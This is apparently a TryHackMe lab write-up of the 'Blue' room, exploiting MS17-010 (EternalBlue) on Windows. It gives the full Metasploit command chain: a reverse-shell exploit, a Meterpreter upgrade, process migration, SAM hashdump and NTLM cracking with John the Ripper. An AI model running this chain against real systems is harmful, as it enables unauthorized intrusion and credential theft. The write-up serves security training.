# 🔴 TryHackMe – Blue  
## MS17-010 (EternalBlue) Analysis

---

##  Ethics and Legal Disclaimer

This work was performed exclusively in the **TryHackMe lab environment**.

- Flags are not shared  
- IP addresses are not disclosed  
- Real user data is not published  
- Exploit source code is not distributed  

Purpose: **to analyze the attack chain technically and raise defensive awareness**.

---

# 🎯 Operational Scenario

On an unpatched Windows system:

1. SMB service was verified  
2. MS17-010 vulnerability detected  
3. Initial access achieved via EternalBlue  
4. Shell → Meterpreter upgrade performed  
5. Session stabilized (process migration)  
6. SYSTEM privileges verified  
7. SAM database hashes extracted  
8. Hashes analyzed offline  

---

# 1️- Recon – SMB and Vulnerability Verification

SMB service was scanned:

```bash
nmap -p 445 --script smb-vuln-ms17-010 <target>
```
Purpose:

- Check if port 445 is open
    
- Identify MS17-010 vulnerability
    
- Verify if target is exploitable
    

---

# 2️- Initial Access – EternalBlue Exploitation

Started Metasploit:
```bash 
msfconsole -q
```
Loaded exploit module:

```bash 
use exploit/windows/smb/ms17_010_eternalblue
```
Configured parameters:
```bash
set RHOSTS <target>  
set LHOST <vpn_interface_ip>  
set LPORT 4444
Run exploit:
run
```

### Technical Explanation

- Specially crafted SMB packets sent
    
- Kernel-level buffer overflow triggered
    
- Memory corruption injected shellcode
    
- Reverse TCP connection initiated
    

Initially, the **reverse connection did not arrive**.

---

# ⚠️ Failure Scenarios and Solutions

### 1️⃣ Reverse Connection Not Received

Cause:

- Routing or load issue with the connected OpenVPN server
    

Solution:

- Connected to an alternative VPN server
    
- Re-ran the exploit
    
- Reverse Meterpreter session successfully established
    

**Lesson learned:** Network infrastructure is as critical as technical exploit parameters.

---

# 3️⃣ Shell → Meterpreter Upgrade

The received session was a basic shell.

Upgraded to Meterpreter:
```bash 
use post/multi/manage/shell_to_meterpreter  
set SESSION 1  
run  
sessions -i 2
```
Module functionality:

- Loads Meterpreter payload on the target
    
- Establishes a new Meterpreter session
    
- Enables advanced post-exploitation capabilities
    

---

# 4️⃣ Privilege Verification

```bash 
getuid
```
Output:

NT AUTHORITY\SYSTEM

System info:
```bash 
sysinfo
```
---

# 5️⃣ Session Stabilization – Process Migration

Post-exploit session was in a temporary process.

Selected long-running SYSTEM service:

- **spoolsv.exe**

Migrated:

```bash 
migrate <PID> 
```

Purpose:

- Inject Meterpreter DLL into target process
    
- Increase session stability
    
- Reduce crash risk after exploit
    

MITRE mapping: T1055 – Process Injection

**Note:** This is stabilization, not persistence or hidden backdoor.

---

# 6️⃣ Internal Recon

```bash pwd  
cd C:\  
ls  
search -f *.txt
```
Purpose:

- Explore user directories
    
- Understand system access scope
    

---

# 7️⃣ Credential Access – Hash Extraction

With SYSTEM privileges:
```bash
hashdump
```
- Extracted NTLM hashes from SAM database
    
- No additional gather module required
    

---

# - NTLM Hash Structure

```bash
username:RID:LMHASH:NTHASH:::
```
- No salt included
    
- MD4-based
    
- Weak passwords are quickly cracked
    

---

# 8️⃣ Offline Hash Analysis

Saved hashes locally:

```bash 
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  
```
```bash 
john --show hashes.txt
```
Purpose:

- Password security analysis
    
- Identify weak password risks
    

Cracked passwords are not shared.

---

# Attack Chain Overview

|Phase|Action|
|---|---|
|Recon|SMB verification|
|Initial Access|MS17-010 exploitation|
|Session Upgrade|shell_to_meterpreter|
|Privilege Context|SYSTEM verification|
|Stabilization|spoolsv.exe migration|
|Credential Access|hashdump|
|Offline Analysis|NTLM cracking|

---

# MITRE ATT&CK Mapping

|Tactic|Technique|
|---|---|
|Initial Access|T1210 – Exploitation of Remote Services|
|Execution|T1059 – Command Execution|
|Privilege Escalation|T1068 – Exploitation for Privilege Escalation|
|Credential Access|T1003 – OS Credential Dumping|
|Defense Evasion|T1055 – Process Injection|
|Command & Control|T1071 – Application Layer Protocol|

---

# CV Value / Portfolio Highlights

- Understanding of kernel-level RCE impact
    
- Post-exploit session management
    
- Shell → Meterpreter upgrade implementation
    
- Process stabilization knowledge
    
- Windows credential architecture
    
- NTLM hash analysis skills
    
- Troubleshooting failure scenarios
    

---

# Conclusion

On an unpatched Windows system:

- Initial Access
    
- SYSTEM-level control
    
- Credential extraction
    

was analyzed **ethically in a lab environment**.

Focus: **Methodology + Operational Flow + Technical Depth + Defensive Awareness**